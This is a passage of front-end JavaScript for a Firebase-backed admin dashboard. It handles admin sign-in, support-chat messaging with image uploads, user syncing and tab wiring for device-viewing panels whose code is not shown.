  if (!file.type.startsWith("image/") || file.size <= maxBytes) {
    return {
      contentType: file.type || "application/octet-stream",
      fileName: file.name,
      dataBase64: await adminFileToBase64(file),
      sizeBytes: file.size,
    };
  }
  const bitmap = await createImageBitmap(file);
  const maxDim = 1920;
  let w = bitmap.width;
  let h = bitmap.height;
  const scale = Math.min(1, maxDim / Math.max(w, h));
  w = Math.max(1, Math.round(w * scale));
  h = Math.max(1, Math.round(h * scale));
  const canvas = document.createElement("canvas");
  canvas.width = w;
  canvas.height = h;
  canvas.getContext("2d").drawImage(bitmap, 0, 0, w, h);
  bitmap.close?.();
  let quality = 0.85;
  let blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg", quality));
  while (blob && blob.size > maxBytes && quality > 0.45) {
    quality -= 0.1;
    blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg", quality));
  }
  if (!blob) throw new Error("Could not compress image");
  const compressed = new File([blob], (file.name || "image").replace(/\.\w+$/, "") + ".jpg", {
    type: "image/jpeg",
  });
  return {
    contentType: "image/jpeg",
    fileName: compressed.name,
    dataBase64: await adminFileToBase64(compressed),
    sizeBytes: compressed.size,
  };
}

async function uploadAdminSupportMedia(uid, file, text) {
  const prepared = await prepareAdminSupportUploadFile(file);
  if (prepared.sizeBytes > 3 * 1024 * 1024) {
    throw new Error("File is still too large after compression (max ~3MB). Try a smaller image.");
  }
  const result = await api(`/api/admin/support/chats/${encodeURIComponent(uid)}/upload`, {
    method: "POST",
    body: JSON.stringify({
      contentType: prepared.contentType,
      fileName: prepared.fileName,
      dataBase64: prepared.dataBase64,
      text: text || "",
    }),
  });
  return result.message;
}

async function sendAdminSupportMessage() {
  if (adminSupportSending || !activeSupportUid) return;
  const input = document.getElementById("admin-support-input");
  const text = String(input?.value || "").trim();
  const file = adminSupportPendingFile;
  if (!text && !file) return;
  adminSupportSending = true;
  setAdminSupportStatus(file ? "Uploading…" : "Sending…");
  try {
    let message;
    if (file) {
      message = await uploadAdminSupportMedia(activeSupportUid, file, text);
      clearAdminSupportAttach();
    } else {
      const data = await api(
        `/api/admin/support/chats/${encodeURIComponent(activeSupportUid)}/messages`,
        { method: "POST", body: JSON.stringify({ text }) }
      );
      message = data.message;
    }
    if (input) input.value = "";
    if (message && !supportThreadMessages.some((m) => m.messageId === message.messageId)) {
      supportThreadMessages.push(message);
      renderAdminSupportMessages();
    }
    await loadSupportInbox({ quiet: true });
    setAdminSupportStatus("Sent");
  } catch (e) {
    setAdminSupportStatus(e instanceof Error ? e.message : String(e));
  } finally {
    adminSupportSending = false;
  }
}

function setAuthError(message) {
  if (!authStatus) return;
  authStatus.textContent = message || "";
  authStatus.classList.toggle("admin-auth-error", Boolean(message));
}

function setLoginBusy(on, message = "") {
  const hint = document.getElementById("auth-loading-hint");
  const emailBtn = document.getElementById("btn-login-email");
  const googleBtn = document.getElementById("btn-login-google");
  document.body.classList.toggle("admin-login-busy", Boolean(on));
  if (emailBtn) emailBtn.disabled = Boolean(on);
  if (googleBtn) googleBtn.disabled = Boolean(on);
  if (hint) {
    hint.hidden = !on;
    if (on && message) hint.textContent = message;
  }
  if (on && message) {
    if (authStatus) {
      authStatus.classList.remove("admin-auth-error");
      authStatus.textContent = message;
    }
  }
}

function setAdminLoading(on, message = "Loading…") {
  const overlay = document.getElementById("admin-loading");
  const text = document.getElementById("admin-loading-text");
  if (text && message) text.textContent = message;
  show(overlay, Boolean(on));
}

async function enterAdmin(user) {
  setAdminLoading(true, "Checking admin access…");
  setLoginBusy(true, "Checking admin access…");
  idToken = await user.getIdToken(true);
  setAdminLoading(true, "Verifying admin permissions…");
  const me = await api("/api/admin/me");
  if (!me.isAdmin) {
    show(viewLogin, false);
    show(viewApp, false);
    show(viewDenied, true);
    if (deniedEmail) deniedEmail.textContent = `Signed in as ${user.email || user.uid}`;
    return;
  }
  show(viewLogin, false);
  show(viewDenied, false);
  show(viewApp, true);
  if (adminUser) adminUser.textContent = me.email || user.email || "";
  setAdminLoading(true, "Loading dashboard…");
  activeTab = "dashboard";
  document.querySelectorAll("#admin-main-tabs .admin-tab").forEach((btn) => {
    btn.classList.toggle("active", btn.getAttribute("data-tab") === "dashboard");
  });
  document.querySelectorAll(".admin-panel").forEach((panel) => {
    panel.hidden = panel.id !== "tab-dashboard";
  });
  setUsersSubview("list");
  await loadDashboard();
  startSupportInboxPolling();
  void refreshSupportTabBadge();
  setAuthError("");
  if (authStatus) authStatus.textContent = "";
}

function setLoggedOut() {
  if (loginInProgress) return;
  idToken = "";
  void stopLiveViewer();
  stopAdminSupportThreadPoll();
  stopSupportInboxPolling();
  activeSupportUid = "";
  supportThreadMessages = [];
  supportChatsCache = [];
  exploreCtx = null;
  openUserUid = "";
  setAdminLoading(false);
  setLoginBusy(false);
  show(viewApp, false);
  show(viewDenied, false);
  show(viewLogin, true);
}

/** Complete login even when Firebase session already exists (onAuthStateChanged may not re-fire). */
async function completeAdminLogin(user) {
  if (!user) return;
  loginInProgress = true;
  try {
    await enterAdmin(user);
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    setAuthError(msg);
    setAdminLoading(false);
    setLoginBusy(false);
    show(viewApp, false);
    show(viewDenied, false);
    show(viewLogin, true);
    try {
      loginInProgress = false;
      if (auth) await signOut(auth);
    } catch {
      /* ignore */
    }
    return;
  } finally {
    loginInProgress = false;
    setAdminLoading(false);
    setLoginBusy(false);
  }
}

async function loginWithEmailPassword() {
  const email = document.getElementById("auth-email")?.value?.trim();
  const password = document.getElementById("auth-password")?.value || "";
  if (!email || !password) {
    setAuthError("Enter email and password.");
    return;
  }
  if (!auth) {
    setAuthError("Sign-in is not ready yet. Wait a second and try again.");
    return;
  }
  loginInProgress = true;
  setAdminLoading(true, "Signing in…");
  setLoginBusy(true, "Signing in…");
  setAuthError("");
  try {
    const cred = await signInWithEmailAndPassword(auth, email, password);
    await completeAdminLogin(cred.user);
  } catch (e) {
    loginInProgress = false;
    setAdminLoading(false);
    setLoginBusy(false);
    const code = e?.code ? ` (${e.code})` : "";
    setAuthError((e instanceof Error ? e.message : String(e)) + code);
  }
}

async function main() {
  if (authStatus) {
    authStatus.classList.remove("admin-auth-error");
    authStatus.textContent = "Preparing sign-in…";
  }

  const cfgRes = await fetch("/api/config", { cache: "no-store" });
  if (!cfgRes.ok) throw new Error(`Failed to load /api/config (${cfgRes.status})`);
  const cfg = await cfgRes.json();
  firebaseConfig = cfg.firebase;
  if (!firebaseConfig?.apiKey || !firebaseConfig?.projectId) {
    throw new Error("Firebase web config missing on server. Check FIREBASE_WEB_* env vars.");
  }
  const app = initializeApp(firebaseConfig);
  auth = getAuth(app);

  document.querySelectorAll("#admin-main-tabs .admin-tab").forEach((btn) => {
    btn.addEventListener("click", () => setTab(btn.getAttribute("data-tab") || "dashboard"));
  });
  document.getElementById("btn-users-refresh")?.addEventListener("click", () => loadUsers());
  document.getElementById("users-search")?.addEventListener("keydown", (ev) => {
    if (ev.key === "Enter") void loadUsers();
  });
  document.getElementById("users-status")?.addEventListener("change", () => loadUsers());

  document.getElementById("btn-support-refresh")?.addEventListener("click", () => loadSupportInbox());
  document.getElementById("support-search")?.addEventListener("keydown", (ev) => {
    if (ev.key === "Enter") void loadSupportInbox();
  });
  document.getElementById("btn-admin-support-attach")?.addEventListener("click", () => {
    document.getElementById("admin-support-file")?.click();
  });
  document.getElementById("admin-support-file")?.addEventListener("change", (ev) => {
    const file = ev.target?.files?.[0] || null;
    if (!file) {
      clearAdminSupportAttach();
      return;
    }
    const okType = /^(image\/(jpeg|png|webp)|video\/(mp4|webm))$/i.test(file.type);
    const max = file.type.startsWith("video/") ? 50 * 1024 * 1024 : 10 * 1024 * 1024;
    if (!okType) {
      alert("Only JPEG/PNG/WebP images or MP4/WebM videos are allowed.");
      clearAdminSupportAttach();
      return;
    }
    if (file.size > max) {
      alert(file.type.startsWith("video/") ? "Video max 50MB." : "Image max 10MB.");
      clearAdminSupportAttach();
      return;
    }
    adminSupportPendingFile = file;
    const prev = document.getElementById("admin-support-attach-preview");
    if (prev) {
      prev.hidden = false;
      prev.textContent = `Attached: ${file.name} (${(file.size / (1024 * 1024)).toFixed(2)} MB)`;
    }
  });
  document.getElementById("btn-admin-support-send")?.addEventListener("click", () => {
    void sendAdminSupportMessage();
  });
  document.getElementById("admin-support-input")?.addEventListener("keydown", (ev) => {
    if (ev.key === "Enter" && !ev.shiftKey) {
      ev.preventDefault();
      void sendAdminSupportMessage();
    }
  });
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible" && idToken) {
      void refreshSupportTabBadge();
      if (activeTab === "support") void loadSupportInbox();
    }
  });

  document.getElementById("btn-back-users")?.addEventListener("click", () => {
    void stopLiveViewer();
    setUsersSubview("list");
  });
  document.getElementById("btn-back-user-devices")?.addEventListener("click", () => {
    void stopLiveViewer();
    if (openUserUid) void openUser(openUserUid);
    else setUsersSubview("list");
  });
  document.getElementById("btn-device-refresh")?.addEventListener("click", () => {
    if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
  });
  document.getElementById("admin-device-select")?.addEventListener("change", (ev) => {
    const deviceId = ev.target.value;
    if (exploreCtx?.ownerUid && deviceId) {
      void stopLiveViewer();
      void openDeviceExplore(exploreCtx.ownerUid, deviceId);
    }
  });
  document.querySelectorAll("#admin-phone-tabs .phone-tab").forEach((btn) => {
    btn.addEventListener("click", () => setPhoneTab(btn.getAttribute("data-phone-tab") || "camera"));
  });
  wireAdminScreenMirrorPanel();
  wireAdminAppsPanel();

  document.getElementById("btn-admin-add")?.addEventListener("click", async () => {
    const input = document.getElementById("admin-email-input");
    const email = String(input?.value || "").trim();
    if (!email) return;
    try {
      await api("/api/admin/admins", { method: "POST", body: JSON.stringify({ email }) });
      if (input) input.value = "";
      await loadAdmins();
    } catch (e) {
      alert(e instanceof Error ? e.message : String(e));
    }
  });

  document.getElementById("btn-sync")?.addEventListener("click", async () => {
    const status = document.getElementById("dashboard-status");
    try {
      if (status) status.textContent = "Syncing from Firebase Auth…";
      const data = await api("/api/admin/sync-users", { method: "POST", body: "{}" });
      if (status) status.textContent = `Synced ${data.synced || 0} user(s).`;
      await loadDashboard();
      if (activeTab === "users") await loadUsers();
    } catch (e) {
      alert(e instanceof Error ? e.message : String(e));
    }
  });

  document.getElementById("btn-logout")?.addEventListener("click", () => signOut(auth));
  document.getElementById("btn-denied-logout")?.addEventListener("click", () => signOut(auth));

  document.getElementById("btn-admin-media-close")?.addEventListener("click", () => {
    show(document.getElementById("admin-media-viewer"), false);
    const body = document.getElementById("admin-media-body");
    if (body) body.innerHTML = "";
  });
  document.getElementById("admin-media-viewer")?.addEventListener("click", (ev) => {
    if (ev.target === document.getElementById("admin-media-viewer")) {
      show(document.getElementById("admin-media-viewer"), false);
    }
  });

  const loginForm = document.getElementById("admin-login-form");
  loginForm?.addEventListener("submit", (ev) => {
    ev.preventDefault();
    void loginWithEmailPassword();
  });

  document.getElementById("btn-login-google")?.addEventListener("click", async () => {
    if (!auth) {
      setAuthError("Sign-in is not ready yet. Wait a second and try again.");
      return;
    }
    loginInProgress = true;
    setAdminLoading(true, "Opening Google…");
    setLoginBusy(true, "Opening Google…");
    setAuthError("");
    try {
      const cred = await signInWithPopup(auth, new GoogleAuthProvider());
      await completeAdminLogin(cred.user);
    } catch (e) {
      loginInProgress = false;
      setAdminLoading(false);
      setLoginBusy(false);
      const code = e?.code ? ` (${e.code})` : "";
      setAuthError((e instanceof Error ? e.message : String(e)) + code);
    }
  });

  if (authStatus) authStatus.textContent = "Ready — enter email and password, then Sign in.";

  onAuthStateChanged(auth, async (user) => {
    if (!authBootstrapped) {
      authBootstrapped = true;
      if (user) {
        setAdminLoading(true, "Restoring admin session…");
        await completeAdminLogin(user);
      } else {
        setLoggedOut();
      }
      return;
    }
    // Later auth changes: ignore sign-in events (form handler owns that). Only handle logout.
    if (!user && !loginInProgress) setLoggedOut();
  });
}

main().catch((e) => {
  const msg = e instanceof Error ? e.message : String(e);
  setAuthError(msg);
  setAdminLoading(false);
  setLoginBusy(false);
});
